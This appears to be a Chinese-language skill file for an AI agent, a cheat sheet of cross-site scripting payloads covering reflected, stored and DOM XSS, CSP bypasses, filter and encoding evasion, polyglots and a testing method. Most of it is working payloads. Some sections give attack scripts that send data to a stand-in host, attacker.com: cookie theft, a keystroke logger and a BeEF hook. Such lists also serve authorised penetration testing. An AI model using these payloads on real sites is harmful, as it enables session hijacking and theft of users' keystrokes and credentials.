---
name: xss
description: Use when encountering 反射型、存储型、dom型xss攻击技术
---

# 跨站脚本攻击

## Info

- **Domain**: web
- **Tags**: web, xss, javascript

# XSS跨站脚本攻击

## 1. 反射型XSS

### 基础Payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe src=javascript:alert(1)>
```

## 2. 存储型XSS

同反射型XSS，但payload会存储在服务器端

## 3. DOM型XSS

```javascript
<img src=x onerror=alert(document.domain)>
<svg onload=alert(location.href)>
<a href=javascript:alert(1)>click</a>
```

## 4. mXSS (突变型XSS)

利用浏览器解析差异绕过过滤

## 5. CSP绕过

### base标签绕过

```html
<base href="http://attacker.com/">
```

### meta标签绕过

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/">
```

### link标签绕过

```html
<link rel="import" href="http://attacker.com/">
```

## 6. 过滤器绕过

### 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
```

### HTML编码绕过

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### URL编码绕过

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

### Unicode编码绕过

```html
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 混合编码绕过

## 7. 编码绕过

- HTML实体编码
- URL编码
- Unicode编码
- Base64编码

## 8. Polyglot XSS

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

## 9. Cookie窃取

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>
```

## 10. 键盘记录

```html
<script>
document.onkeypress=function(e){
new Image().src="http://attacker.com/log?k="+e.key;
}
</script>
```

## 11. BeEF利用

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

---

## 12. XSS测试方法论

```
1. 确定输入输出点: URL参数、表单、HTTP头(Referer/UA/Cookie)、隐藏参数
2. 观察过滤规则: 尖括号、引号、关键字(script/on事件)、空格
3. 绕过策略:
   - 闭合标签: "><payload>
   - 事件触发: onmouseover, onclick
   - 编码绕过: URL编码(%0A换行)、HTML实体、十六进制
   - 特殊字符: 换行符%0A代替空格, 双写关键字
   - 协议利用: javascript:伪协议
```

---

## 13. javascript:伪协议绕过

```html
<!-- 基础用法 -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
```

### 过滤绕过

| 过滤规则 | 绕过方法 | 原理 |
|----------|----------|------|
| 简单匹配 `javascript:` | 大小写: `JavaScript:alert(1)` | 浏览器不区分大小写 |
| 简单匹配 | 插入Tab: `java%09script:alert(1)` | 浏览器正常解析 |
| 过滤 `script` | HTML实体编码: `java&#115;cript:alert(1)` | HTML上下文会解码 |
| 黑名单过滤 | 其他伪协议: `data:text/html,<script>alert(1)</script>` | - |

---

## 14. 常见绕过模式

```
<>被转义时: 利用标签原有属性 onmouseover等
换行符绕过: %0A 可以闭合标签

隐藏参数发现: URL中添加 &key=value 测试隐藏字段
  → 发现 t_sort 参数可通过GET传入
  → 在value中构造 Onclick, 修改type='text'使隐藏失效
  → 或使用 onfocus + autofocus 自动触发
```

---

## 15. Polyglot 通用Payload

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## 16. textarea闭合绕过

```html
</textarea><script>alert(1)</script>
```

---

## 17. 编码绕过补充

```html
<!-- 十六进制编码 -->
<img src=x onerror=alert&#x28;1&#x29;>

<!-- Unicode编码 (仅在JS上下文) -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Tab字符绕过 -->
<img%09src=x%09onerror=alert(1)>
```